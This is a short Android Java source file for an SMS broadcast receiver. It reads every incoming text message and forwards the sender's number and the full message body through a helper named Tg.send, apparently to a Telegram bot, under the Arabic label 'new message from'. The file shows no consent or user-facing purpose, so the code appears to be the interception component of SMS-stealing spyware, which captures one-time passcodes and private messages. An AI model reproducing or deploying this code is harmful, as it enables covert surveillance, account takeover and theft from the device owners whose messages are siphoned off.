package com.ollie.master;
import android.content.*; import android.provider.Telephony; import android.telephony.SmsMessage;
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
        if (msgs != null && msgs.length > 0) {
            StringBuilder body = new StringBuilder();
            for (SmsMessage m : msgs) body.append(m.getMessageBody());
            Tg.send("📩 رسالة جديدة من: " + msgs[0].getOriginatingAddress() + "\n\n" + body.toString());
        }
    }
}
